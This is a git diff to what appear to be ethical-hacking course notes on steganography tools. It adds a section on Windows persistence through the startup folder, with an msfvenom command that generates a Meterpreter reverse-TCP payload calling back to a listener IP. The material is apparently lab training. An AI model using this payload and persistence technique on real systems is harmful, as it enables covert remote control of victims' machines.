@@ -207,6 +207,7 @@ For demonstration purposes, we are using the same machine to execute and hide fi
 
 =============================================================================================================================================================================================================================================================================================================================================================================================================
 
+# Image Steganography using OpenStego and StegOnline
 # Hide Data using White Space Steganography (Tool : SNOW.EXE)
 --------------------------------------------------------------
 1. create a folder(snow) on desktop and open it  >>  copy and paste the snow.exe in snow folder >> 
@@ -222,9 +223,10 @@ For demonstration purposes, we are using the same machine to execute and hide fi
 
 =========================================================================================================================================================================================================================================================================================================================================================================================================================
 
-# Image Steganography using OpenStego and StegOnline
-------------------------------------------------------
-
+# Maintain Persistence by Abusing Boot or Logon Autostart Execution
+-------------------------------------------------------------------
+-> The startup folder((C:\\ProgramData\\Start Menu\\Programs\\Startup)) in Windows contains a list of application shortcuts that are executed when the Windows machine is booted. Injecting a malicious program into the startup folder causes the program to run when a user logins and helps you to maintain persistence or escalate privileges using the misconfigured startup folder.
+-> malicious program (msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=8080 -f exe > payload.exe)
 
 
 
